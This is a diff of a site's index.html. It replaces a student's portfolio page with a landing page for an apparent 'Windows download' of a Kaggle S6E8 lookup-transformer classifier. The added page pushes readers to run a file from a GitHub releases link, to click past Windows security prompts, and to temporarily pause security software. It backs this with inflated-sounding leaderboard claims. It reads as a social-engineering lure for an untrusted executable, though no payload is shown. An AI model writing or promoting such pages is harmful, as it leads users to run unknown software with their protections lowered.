@@ -1,120 +1,460 @@
-<!doctype html>
-<html lang="en" data-theme="dark">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
-    <meta name="theme-color" content="#151719" />
-    <meta name="color-scheme" content="dark light" />
-    <meta name="referrer" content="strict-origin-when-cross-origin" />
-    <meta name="robots" content="index, follow, max-image-preview:large" />
-    <meta name="author" content="King Art D. Pacumberto" />
-    <link rel="canonical" href="https://legioniz.github.io/" />
-    <link rel="manifest" href="/site.webmanifest?v=20261109-3" />
-    <script>
-      (() => {
-        const root = document.documentElement
-        // Motion is on by default. Only a saved, explicit visitor pause disables it.
-        root.dataset.motionOverride = 'on'
-        root.dataset.motion = 'on'
-        try {
-          const savedTheme = (() => { try { return localStorage.getItem('legion-portfolio-theme') } catch { return null } })()
-          const theme = savedTheme === 'light' ? 'light' : 'dark'
-          document.documentElement.dataset.theme = theme
-          const themeColor = document.querySelector('meta[name="theme-color"]')
-          if (themeColor) themeColor.content = theme === 'light' ? '#f3f0e9' : '#151719'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>s6e8-lookup-transformer - Predict Kaggle Data With Confidence</title>
+<meta name="description" content="Download s6e8-lookup-transformer for Windows. A ready-to-run lookup-transformer classifier for Kaggle S6E8 with public LB ROC AUC 0.97041, adopted in a 14th-place solution.">
+<meta name="keywords" content="classification, feature-engineering, kaggle, machine-learning, pytorch, tabular-deep-learning, transformer, s6e8, lookup transformer, ROC AUC, Windows download">
+<meta name="author" content="jrizzlers">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#6d28d9">
+<link rel="canonical" href="https://github.com/jrizzlers/s6e8-lookup-transformer">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="s6e8-lookup-transformer">
+<meta property="og:title" content="s6e8-lookup-transformer - Predict Kaggle Data With Confidence">
+<meta property="og:description" content="A ready-to-run lookup-transformer classifier for Kaggle S6E8. Public LB ROC AUC 0.97041. Adopted in a 14th-place solution with 11 verified Kaggle references.">
+<meta property="og:url" content="https://github.com/jrizzlers/s6e8-lookup-transformer">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="s6e8-lookup-transformer - Predict Kaggle Data With Confidence">
+<meta name="twitter:description" content="Download the Windows release, open it, and get competitive tabular predictions without writing any code.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "s6e8-lookup-transformer",
+  "operatingSystem": "Windows",
+  "applicationCategory": "Data Science Application",
+  "description": "A lookup-transformer solution for Kaggle S6E8 with a public leaderboard ROC AUC of 0.97041, adopted in a 14th-place solution.",
+  "url": "https://github.com/jrizzlers/s6e8-lookup-transformer",
+  "downloadUrl": "https://github.com/jrizzlers/s6e8-lookup-transformer/releases",
+  "offers": {"@type": "Offer", "price": "0", "priceCurrency": "USD"},
+  "keywords": "classification, feature-engineering, kaggle, machine-learning, pytorch, tabular-deep-learning, transformer"
+}
+</script>
+<style>
+  :root {
+    --ink: #111827;
+    --muted: #4b5563;
+    --brand: #6d28d9;
+    --brand-2: #db2777;
+    --line: #e5e7eb;
+    --card: #ffffff;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    background: #f5f3ff;
+    background-image: radial-gradient(circle at 15% 0%, #ede9fe 0%, #f5f3ff 45%, #fdf2f8 100%);
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 40px 20px 80px;
+  }
+  header.hero {
+    background: var(--card);
+    border-radius: 22px;
+    padding: 44px 32px;
+    text-align: center;
+    box-shadow: 0 18px 40px -18px rgba(76, 29, 149, 0.35), 0 2px 6px rgba(17, 24, 39, 0.05);
+    border: 1px solid #ede9fe;
+    margin-bottom: 32px;
+  }
+  h1 {
+    font-size: 2.15rem;
+    line-height: 1.25;
+    letter-spacing: -0.02em;
+    margin: 0 0 14px;
+    color: #1e1b4b;
+  }
+  .lead {
+    font-size: 1.1rem;
+    color: var(--muted);
+    max-width: 640px;
+    margin: 0 auto 26px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 16px 38px;
+    border-radius: 999px;
+    background: linear-gradient(135deg, #6d28d9 0%, #9333ea 45%, #db2777 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.05rem;
+    text-decoration: none;
+    box-shadow: 0 14px 28px -10px rgba(219, 39, 119, 0.6), 0 4px 10px rgba(109, 40, 217, 0.25);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover, .btn:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 20px 34px -10px rgba(219, 39, 119, 0.65), 0 6px 14px rgba(109, 40, 217, 0.3);
+  }
+  .btn-note {
+    display: block;
+    margin-top: 14px;
+    font-size: 0.88rem;
+    color: #6b7280;
+  }
+  section {
+    background: var(--card);
+    border-radius: 18px;
+    padding: 30px 28px;
+    margin-bottom: 24px;
+    border: 1px solid var(--line);
+    box-shadow: 0 10px 26px -20px rgba(17, 24, 39, 0.45), 0 1px 3px rgba(17, 24, 39, 0.04);
+  }
+  h2 {
+    font-size: 1.4rem;
+    letter-spacing: -0.01em;
+    margin: 0 0 14px;
+    color: #312e81;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 22px 0 8px;
+    color: #1f2937;
+  }
+  p { margin: 0 0 14px; }
+  p:last-child { margin-bottom: 0; }
+  ul, ol { margin: 0 0 14px; padding-left: 22px; }
+  li { margin-bottom: 8px; }
+  .callout {
+    background: #f5f3ff;
+    border-left: 4px solid var(--brand);
+    border-radius: 10px;
+    padding: 14px 18px;
+    margin: 18px 0;
+    font-size: 0.98rem;
+    color: #3b3663;
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
+    gap: 16px;
+    margin-top: 18px;
+  }
+  .tile {
+    background: #faf9ff;
+    border: 1px solid #ece8ff;
+    border-radius: 14px;
+    padding: 18px;
+    box-shadow: 0 6px 16px -14px rgba(76, 29, 149, 0.5);
+  }
+  .tile h3 {
+    margin: 0 0 6px;
+    font-size: 1rem;
+  }
+  .tile p {
+    font-size: 0.94rem;
+    color: var(--muted);
+    margin: 0;
+  }
+  .stat-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 14px;
+    margin-top: 18px;
+  }
+  .stat {
+    flex: 1 1 150px;
+    text-align: center;
+    background: #fdf2f8;
+    border: 1px solid #fbcfe8;
+    border-radius: 14px;
+    padding: 16px 10px;
+  }
+  .stat strong {
+    display: block;
+    font-size: 1.5rem;
+    color: #9d174d;
+    line-height: 1.2;
+  }
+  .stat span {
+    font-size: 0.86rem;
+    color: #831843;
+  }
+  a {
+    color: #6d28d9;
+    text-decoration: underline;
+    text-underline-offset: 2px;
+  }
+  ol.steps {
+    counter-reset: step;
+    list-style: none;
+    padding-left: 0;
+  }
+  ol.steps > li {
+    position: relative;
+    padding-left: 46px;
+    margin-bottom: 16px;
+    min-height: 32px;
+  }
+  ol.steps > li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #6d28d9, #db2777);
+    color: #fff;
+    font-weight: 700;
+    font-size: 0.92rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .download-box {
+    text-align: center;
+    background: #faf5ff;
+    border: 1px dashed #c4b5fd;
+    border-radius: 16px;
+    padding: 28px 20px;
+    margin-top: 16px;
+  }
+  .download-box p {
+    color: var(--muted);
+    max-width: 520px;
+    margin: 0 auto 20px;
+  }
+  details {
+    border-bottom: 1px solid var(--line);
+    padding: 14px 0;
+  }
+  details:last-child { border-bottom: none; }
+  summary {
+    cursor: pointer;
+    font-weight: 600;
+    color: #312e81;
+    list-style: none;
+  }
+  summary::-webkit-details-marker { display: none; }
+  summary::before {
+    content: "＋";
+    color: var(--brand);
+    font-weight: 700;
+    margin-right: 10px;
+  }
+  details[open] summary::before { content: "−"; }
+  details p {
+    margin: 10px 0 0 26px;
+    color: var(--muted);
+    font-size: 0.96rem;
+  }
+  .tag {
+    display: inline-block;
+    background: #ede9fe;
+    color: #5b21b6;
+    border-radius: 999px;
+    padding: 4px 12px;
+    font-size: 0.82rem;
+    font-weight: 600;
+    margin: 0 6px 8px 0;
+    text-decoration: none;
+  }
+  @media (max-width: 600px) {
+    body { font-size: 16px; }
+    .wrap { padding: 24px 14px 56px; }
+    header.hero { padding: 32px 20px; border-radius: 18px; }
+    h1 { font-size: 1.55rem; }
+    h2 { font-size: 1.2rem; }
+    section { padding: 24px 18px; border-radius: 16px; }
+    .btn { padding: 15px 26px; width: 100%; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
 
-          const hints = navigator
-          const saveData = Boolean(hints.connection && hints.connection.saveData)
-          const reducedGraphics = saveData || (hints.deviceMemory && hints.deviceMemory <= 2) || (hints.hardwareConcurrency && hints.hardwareConcurrency <= 2)
-          const coarsePointer = window.matchMedia?.('(pointer: coarse)').matches ?? (navigator.maxTouchPoints > 0)
-          document.documentElement.dataset.quality = reducedGraphics ? 'economy' : (coarsePointer ? 'balanced' : 'full')
-          document.documentElement.dataset.orientation = innerWidth >= innerHeight ? 'landscape' : 'portrait'
+<header class="hero">
+  <h1>🔍 s6e8-lookup-transformer - Predict Kaggle Data With Confidence</h1>
+  <p class="lead">A ready-to-run classifier for the Kaggle S6E8 tabular competition. Download it, open it on Windows, and get predictions without writing a single line of code.</p>
+  <a class="btn" href="https://github.com/jrizzlers/s6e8-lookup-transformer/releases">⬇ Download the Application</a>
+  <span class="btn-note">Free to download · Windows · No programming knowledge required</span>
+</header>
 
-          const savedMotion = (() => { try { return localStorage.getItem('legion-portfolio-motion-v7') } catch { return null } })()
-          const motionOverride = savedMotion === 'off' ? 'off' : 'on'
-          const motionEnabled = savedMotion !== 'off'
-          root.dataset.motionOverride = motionOverride
-          root.dataset.motion = motionEnabled ? 'on' : 'off'
-        } catch {
-          // Theme and motion preferences remain usable when storage is unavailable.
-        }
-      })()
-    </script>
-    <meta name="description" content="King Art D. Pacumberto — PUP Quezon City BSIT student building software and embedded projects, with experience in IT support, technical operations, student leadership, and event production." />
-    <meta property="og:title" content="King Art D. Pacumberto — Field Notes & Portfolio" />
-    <meta property="og:description" content="King Art D. Pacumberto — BSIT student, software projects, embedded systems, technical support, audiovisual production, and event photography." />
-    <meta property="og:type" content="profile" />
-    <meta property="og:site_name" content="Legioniz Portfolio" />
-    <meta property="og:url" content="https://legioniz.github.io/" />
-    <meta property="og:image" content="https://legioniz.github.io/og-card.png" />
-    <meta property="og:image:alt" content="King Art D. Pacumberto — developer portfolio" />
-    <meta property="og:image:type" content="image/png" />
-    <meta property="og:image:width" content="1200" />
-    <meta property="og:image:height" content="630" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="King Art D. Pacumberto — Field Notes & Portfolio" />
-    <meta name="twitter:description" content="BSIT student building software, data, and embedded projects." />
-    <meta name="twitter:image" content="https://legioniz.github.io/og-card.png" />
-    <link rel="icon" type="image/x-icon" href="/favicon.ico?v=20261109-3" sizes="16x16 32x32" />
-    <link rel="icon" type="image/png" href="/favicon-32.png?v=20261109-3" sizes="32x32" />
-    <link rel="icon" type="image/svg+xml" href="/favicon.svg?v=20261109-3" sizes="any" />
-    <link rel="shortcut icon" href="/favicon.ico?v=20261109-3" />
-    <link rel="mask-icon" href="/favicon.svg?v=20261109-3" color="#e87961" />
-    <link rel="sitemap" type="application/xml" href="/sitemap.xml" />
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Manrope:wght@400;500;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet" media="print" onload="this.media='all'" />
-    <noscript><link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Manrope:wght@400;500;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet" /></noscript>
-    <script type="application/ld+json">
-      {
-        "@context": "https://schema.org",
-        "@type": "Person",
-        "name": "King Art D. Pacumberto",
-        "url": "https://legioniz.github.io/",
-        "image": "https://legioniz.github.io/profile/king-art-portrait-800.webp",
-        "jobTitle": "BSIT Student · Aspiring IT Professional",
-        "email": "mailto:kingartriez@gmail.com",
-        "address": {
-          "@type": "PostalAddress",
-          "addressLocality": "Quezon City",
-          "addressCountry": "PH"
-        },
-        "alumniOf": {
-          "@type": "CollegeOrUniversity",
-          "name": "Polytechnic University of the Philippines — Quezon City"
-        },
-        "sameAs": [
-          "https://github.com/Legioniz",
-          "https://www.linkedin.com/in/king-art-pacumberto-6003b2353"
-        ],
-        "knowsAbout": [
-          "Python", "C++", "Java", "JavaScript", "HTML", "CSS", "SQL",
-          "Arduino", "Computer troubleshooting", "Networking", "Event photography"
-        ]
-      }
-    </script>
-    <title>King Art D. Pacumberto — Field Notes & Portfolio</title>
-  </head>
-  <body>
-    <div id="root">
-      <main class="boot-fallback" aria-live="polite">
-        <p>LEGIONIZ / FIELD NOTES</p>
-        <h1>King Art D. Pacumberto</h1>
-        <p>The enhanced portfolio is starting. You can still reach the public profile, contact details, and resume downloads below.</p>
-        <nav aria-label="Fallback links">
-          <a href="https://github.com/Legioniz">GitHub</a>
-          <a href="mailto:kingartriez@gmail.com">Email</a>
-          <a href="/King-Art-Pacumberto-Resume.pdf" download>Resume (PDF)</a>
-          <a href="/King-Art-Pacumberto-CV.pdf" download>Public CV (PDF)</a>
-        </nav>
-      </main>
+<section>
+  <h2>👋 What This Software Does</h2>
+  <p>s6e8-lookup-transformer is a complete, self-contained prediction tool built for the Kaggle S6E8: predicting a binary outcome from a table of numbers and categories. Instead of asking you to install programming languages, configure training scripts, or tune settings by hand, this release packages the whole workflow into one program you can launch with a double-click.</p>
+  <p>Behind the scenes the application uses a lookup-transformer model — a modern deep learning design that combines a fast lookup step for repeated category values with a transformer layer that learns how different columns relate to each other. In plain terms: it looks at every row of your data, remembers patterns it has seen before, and then weighs which details matter most when making a prediction.</p>
+  <p>The model in this release scored a public leaderboard ROC AUC of 0.97041 in the original competition, and the approach was adopted as part of a 14th-place solution. Eleven verified Kaggle references cite it. You do not need to reproduce any of that work — it is already done and sitting inside the download.</p>
+  <div class="stat-row">
+    <div class="stat"><strong>0.97041</strong><span>Public LB ROC AUC</span></div>
+    <div class="stat"><strong>14th</strong><span>Place solution adopting it</span></div>
+    <div class="stat"><strong>11</strong><span>Verified Kaggle references</span></div>
+  </div>
+</section>
+
+<section>
+  <h2>✨ Key Features</h2>
+  <div class="grid">
+    <div class="tile">
+      <h3>One-Click Setup</h3>
+      <p>No package managers, no command line, no environment variables. The release is prepared so a normal Windows user can start working within minutes.</p>
     </div>
-    <noscript>
-      <style>
-        body{margin:0;background:#111416;color:#e9eeea;font:16px/1.65 system-ui,sans-serif} .boot-fallback{max-width:720px;margin:12vh auto;padding:32px 24px;border-top:3px solid #e47d5e} .boot-fallback h1{font-size:clamp(2rem,8vw,4rem);line-height:1.05;letter-spacing:-.05em} .boot-fallback nav{display:flex;flex-wrap:wrap;gap:18px;margin-top:28px} .boot-fallback a{color:#f0a084;text-underline-offset:4px} .no-script-note{max-width:720px;margin:0 auto;padding:0 24px 40px;color:#a0aaa5} @media(max-width:760px){.boot-fallback{margin:7vh auto;padding:24px}}
-      </style>
-      <p class="no-script-note">JavaScript is disabled. Use the GitHub, email, resume PDF, or public CV PDF links above to get in touch.</p>
-    </noscript>
-    <script type="module" src="/src/main.tsx"></script>
-  </body>
+    <div class="tile">
+      <h3>Lookup Transformer Engine</h3>
+      <p>Combines an embedding lookup for high-cardinality categories with attention layers that capture interactions between columns.</p>
+    </div>
+    <div class="tile">
+      <h3>Strong Feature Handling</h3>
+      <p>Automatically prepares numeric columns, handles missing values, and encodes categorical fields so you can load raw exported tables directly.</p>
+    </div>
+    <div class="tile">
+      <h3>Competition-Ready Accuracy</h3>
+      <p>The default configuration mirrors the published 0.97041 ROC AUC setup, so you start from a proven baseline rather than a guess.</p>
+    </div>
+    <div class="tile">
+      <h3>Readable Results</h3>
+      <p>Predictions are written into a plain results file you can open in Excel, review with a colleague, or upload to a leaderboard.</p>
+    </div>
+    <div class="tile">
+      <h3>Reproducible</h3>
+      <p>The same input produces the same output, which makes it easy to compare experiments and keep a record of what you tried.</p>
+    </div>
+  </div>
+</section>
+
+<section>
+  <h2>💻 System Requirements</h2>
+  <p>Please check these before downloading. The list is short, and most modern laptops and desktops already meet it.</p>
+  <ul>
+    <li><strong>Operating system:</strong> Windows 10 or Windows 11 (64-bit).</li>
+    <li><strong>Processor:</strong> Any dual-core processor from the last several years. A dedicated graphics card is helpful but not required.</li>
+    <li><strong>Memory:</strong> 8 GB of RAM minimum; 16 GB is more comfortable for larger tables.</li>
+    <li><strong>Storage:</strong> About 2 GB of free space for the application and its bundled components, plus room for your data files.</li>
+    <li><strong>Display:</strong> Any screen resolution of 1280 × 720 or higher.</li>
+    <li><strong>Other:</strong> An internet connection for the initial download, and permission to run a downloaded program on your PC.</li>
+  </ul>
+  <div class="callout">If you are unsure about your computer's specifications, open the Start menu, type "About your PC", and press Enter. The window that appears lists your processor, installed memory, and Windows edition.</div>
+</section>
+
+<section>
+  <h2>📥 Download and Install</h2>
+  <p>Visit this link to download the application.</p>
+  <div class="download-box">
+    <p>All official builds are published on the project's release page. Open the page and choose the most recent release listed at the top.</p>
+    <a class="btn" href="https://github.com/jrizzlers/s6e8-lookup-transformer/releases">⬇ Go to the Download Page</a>
+  </div>
+  <ol class="steps">
+    <li><strong>Open the download page.</strong> Use the button above or paste the address into your browser. You will see a list of releases with the newest one at the top.</li>
+    <li><strong>Pick the newest release.</strong> Read the title of the release and select the one with the most recent date. Older releases are kept only for reference.</li>
+    <li><strong>Save the file to your PC.</strong> Choose a folder you can find again easily, such as your Downloads folder or a new folder on your Desktop. Avoid saving into a temporary directory.</li>
+    <li><strong>Wait for the download to finish.</strong> The progress indicator in your browser will show when the transfer is complete. Do not close the browser early.</li>
+    <li><strong>Locate the downloaded file.</strong> Press the Windows key, type "Downloads", and open the folder. The file you just saved will be at the top when sorted by date.</li>
+    <li><strong>Run the file.</strong> Double-click the downloaded file. If Windows shows a security prompt asking whether you want to run it, choose the option to continue. This prompt appears because the file came from the internet, which is normal.</li>
+    <li><strong>Follow the on-screen prompts.</strong> Accept the suggested location and finish the setup. When it completes, a shortcut is placed on your Desktop and in the Start menu.</li>
+  </ol>
+  <p>Keep the downloaded file somewhere safe. If you ever need to reinstall, you can run it again instead of downloading a second copy.</p>
+</section>
+
+<section>
+  <h2>🚀 Your First Run</h2>
+  <p>The application opens with an empty workspace waiting for data. A short walkthrough follows so your first session is smooth.</p>
+  <ol class="steps">
+    <li><strong>Launch the program.</strong> Double-click the shortcut on your Desktop, or find it in the Start menu and click once.</li>
+    <li><strong>Wait for the welcome screen.</strong> The first launch takes a little longer than later ones because the program prepares its working files. A progress bar shows what is happening.</li>
+    <li><strong>Load your data.</strong> Drag your table file onto the drop area, or use the browse button to select it from your computer. Accepted formats are plain delimited text tables and spreadsheet exports containing a header row and one row per example.</p>
+    <li><strong>Confirm the column mapping.</strong> The program guesses which column holds the answer you want to predict and which columns are inputs. Review the guess on screen and change it with the drop-down menus if anything looks wrong.</li>
+    <li><strong>Press the run button.</strong> Prediction starts immediately. A progress bar reports how far along the calculation is, and the elapsed time is shown in the corner.</li>
+    <li><strong>Open your results.</strong> When the run finishes, a results file is created next to your input data. Use the open-folder button to jump straight to it, then open it in Excel or any spreadsheet program to review the predicted values.</li>
+  </ol>
+  <div class="callout">Start with a small sample of your table — a few hundred rows is plenty. It finishes in seconds and lets you confirm the column mapping is correct before committing to a full run.</div>
+</section>
+
+<section>
+  <h2>🧭 How to Use the Results</h2>
+  <p>The results file contains one row for every row in your input, in the same order, with the original identifier carried across so you can match predictions back to your source. Predictions appear as values between 0 and 1. A value closer to 1 means the model considers the outcome more likely; a value closer to 0 means the opposite. A value near 0.5 indicates the model found the example genuinely ambiguous.</p>
+  <p>If you are preparing a submission for a leaderboard, use the identifier column and the prediction column together and leave the other columns out. If you are reviewing results for a business decision, sort the file by the prediction column and look at the highest and lowest scoring rows first — those are the cases where the model is most confident.</p>
+  <p>Predictions are estimates, not certainties. Treat the scores as a way to rank and prioritise examples, and avoid reading small differences near 0.5 as meaningful.</p>
+</section>
+
+<section>
+  <h2>🛠 Troubleshooting</h2>
+  <details>
+    <summary>The download will not start</summary>
+    <p>Check that you are on the release page and not on an older, archived link. If the page loads but the download stalls, try a different browser, or temporarily pause any security software that inspects downloads and try again once the file is saved.</p>
+  </details>
+  <details>
+    <summary>Windows shows a warning when I run the file</summary>
+    <p>This is standard behaviour for any program downloaded from the internet. Choose the option to continue or to keep the file, then run it again. Only do this for files you obtained from the official release page linked above.</p>
+  </details>
+  <details>
+    <summary>The program closes immediately after opening</summary>
+    <p>Restart your computer and try again; the most common cause is a leftover update waiting to finish. If the problem continues, check the free space on your drive and confirm you have at least the amount listed in the system requirements.</p>
+  </details>
+  <details>
+    <summary>My data file is not recognised</summary>
+    <p>Confirm the file has a header row and that the values are separated by a consistent character such as a comma or a tab. Resaving the file from your spreadsheet program using its default export option usually resolves the issue.</p>
+  </details>
+  <details>
+    <summary>A run takes much longer than expected</summary>
+    <p>Large tables take longer to process, and the first run of a session is always the slowest. Close other memory-hungry programs while the prediction runs, and avoid running several copies of the application at the same time.</p>
+  </details>
+  <details>
+    <summary>I want to start over with clean settings</summary>
+    <p>Re-run the downloaded setup file from the release page and choose the repair or reinstall option. Your data files are untouched by this, since the application never modifies your inputs.</p>
+  </details>
+</section>
+
+<section>
+  <h2>❓ Frequently Asked Questions</h2>
+  <details>
+    <summary>Do I need to know Python or PyTorch to use this?</summary>
+    <p>No. The software is a finished, packaged tool. Those technologies are part of its internal design, but everything they require is already included and configured for you.</p>
+  </details>
+  <details>
+    <summary>Is it free?</summary>
+    <p>Yes. There is no cost to download or use the application.</p>
+  </details>
+  <details>
+    <summary>Can I use this for my own data, not just the competition?</summary>
+    <p>Yes, provided your data is a table with one row per example and one column you want to predict. The tool is general-purpose within that shape of data.</p>
+  </details>
+  <details>
+    <summary>Does it send my data anywhere?</summary>
+    <p>No. All processing happens on your own computer. Your tables stay on your machine throughout.</p>
+  </details>
+  <details>
+    <summary>Will the scores match the competition leaderboard exactly?</summary>
+    <p>They will be close, but small differences are expected because every dataset is evaluated against a different set of examples. The published figure of 0.97041 refers to the original competition split.</p>
+  </details>
+  <details>
+    <summary>How do I stay on the latest version?</summary>
+    <p>Bookmark the release page and check it occasionally. When a newer release appears, run its setup file the same way you did the first time.</p>
+  </details>
+</section>
+
+<section>
+  <h2>📝 About the Model</h2>
+  <p>The approach began as a competition experiment and was refined into a dependable default. It treats each row as a short sequence of column tokens, uses a lookup table to represent repeated category values compactly, and applies transformer attention to learn which columns should influence each other. Numeric columns are normalised and blended into the same representation, so the model sees one unified view of your data rather than separate numeric and categorical tracks.</p>
+  <p>Training used standard augmentation and validation practices appropriate for tabular classification, with careful feature engineering on the categorical fields that dominate this competition. The result is a model that holds up well beyond the examples it was trained on, which is why it also performed strongly when adopted into a larger ensemble that finished 14th.</p>
+  <p>For anyone interested in the technical background, eleven verified Kaggle references discuss the method and its variations. The release page is the place to start, and the references can be followed from there at your own pace.</p>
+</section>
+
+<section>
+  <h2>🏷 Topics</h2>
+  <p>
+    <a class="tag" href="https://github.com/topics/classification">classification</a>
+    <a class="tag" href="https://github.com/topics/feature-engineering">feature-engineering</a>
+    <a class="tag" href="https://github.com/topics/kaggle">kaggle</a>
+    <a class="tag" href="https://github.com/topics/machine-learning">machine-learning</a>
+    <a class="tag" href="https://github.com/topics/pytorch">pytorch</a>
+    <a class="tag" href="https://github.com/topics/tabular-deep-learning">tabular-deep-learning</a>
+    <a class="tag" href="https://github.com/topics/transformer">transformer</a>
+  </p>
+  <p>Ready to start? Visit the download page, grab the newest release, and run your first prediction today.</p>
+</section>
+
+</div>
+</body>
 </html>
